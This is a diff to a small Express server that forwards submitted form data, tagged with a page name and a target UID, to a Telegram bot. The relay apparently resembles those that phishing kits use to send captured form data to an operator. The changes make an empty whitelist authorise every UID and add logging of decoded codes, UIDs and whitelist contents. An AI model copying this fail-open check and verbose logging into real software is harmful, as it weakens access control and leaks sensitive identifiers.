@@ -1,4 +1,5 @@
-   // api/server.js
+ 
+// api/server.js
 // Version compatible avec Vercel (export via module.exports)
 
 const express = require("express");
@@ -64,9 +65,18 @@ app.use((req, res, next) => {
 // --- Whitelist & Rate Limit
 function isUidWhitelisted(uid) {
   const raw = process.env.WHITELIST || "";
-  if (!raw) return false;
+  
+  // ✅ CORRECTION : Whitelist vide = tous les UID autorisés
+  if (!raw.trim()) {
+    console.log("✅ Whitelist vide - UID", uid, "autorisé");
+    return true;
+  }
+  
+  // Whitelist non vide = vérifier l'UID
   const list = raw.split(",").map(s => s.trim()).filter(Boolean);
-  return list.includes(String(uid));
+  const isAllowed = list.includes(String(uid));
+  console.log("🔍 Whitelist check - UID:", uid, "Autorisé:", isAllowed, "Liste:", list);
+  return isAllowed;
 }
 
 function checkRateLimit(uid) {
@@ -115,6 +125,7 @@ app.post("/api/submit", async (req, res) => {
   let uid;
   try {
     uid = String(decodeCode(String(code)));
+    console.log("🔑 Code décodé:", code, "→ UID:", uid);
   } catch {
     return res.status(400).send("invalid code");
   }
@@ -122,6 +133,8 @@ app.post("/api/submit", async (req, res) => {
   const providedKey = String(req.headers["x-api-key"] || "");
   const requiredKey = process.env.API_KEY || "";
   const isOwnerCall = requiredKey && providedKey === requiredKey;
+
+  console.log("🔐 Check sécurité - UID:", uid, "OwnerCall:", isOwnerCall, "Whitelisted:", isUidWhitelisted(uid));
 
   if (!isOwnerCall && !isUidWhitelisted(uid)) {
     return res.status(403).send("Target UID not allowed");
@@ -142,6 +155,8 @@ app.post("/api/submit", async (req, res) => {
   const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
   const text = `<b>Page :</b> ${clean(source || "unknown")}\n<b>UID :</b> ${clean(uid)}\n\n<b>Formulaire :</b>\n${lines}`;
 
+  console.log("📤 Envoi à Telegram - UID:", uid);
+
   try {
     const resp = await fetch(telegramUrl, {
       method: "POST",
@@ -156,13 +171,14 @@ app.post("/api/submit", async (req, res) => {
 
     const j = await resp.json();
     if (!resp.ok || !j.ok) {
-      console.error("Telegram API error:", j);
+      console.error("❌ Telegram API error:", j);
       return res.status(502).send("Telegram API error");
     }
 
+    console.log("✅ Message envoyé à Telegram");
     return res.status(200).send("Formulaire envoyé ✅");
   } catch (err) {
-    console.error("Network error:", err);
+    console.error("❌ Network error:", err);
     return res.status(502).send("Network error");
   }
 });
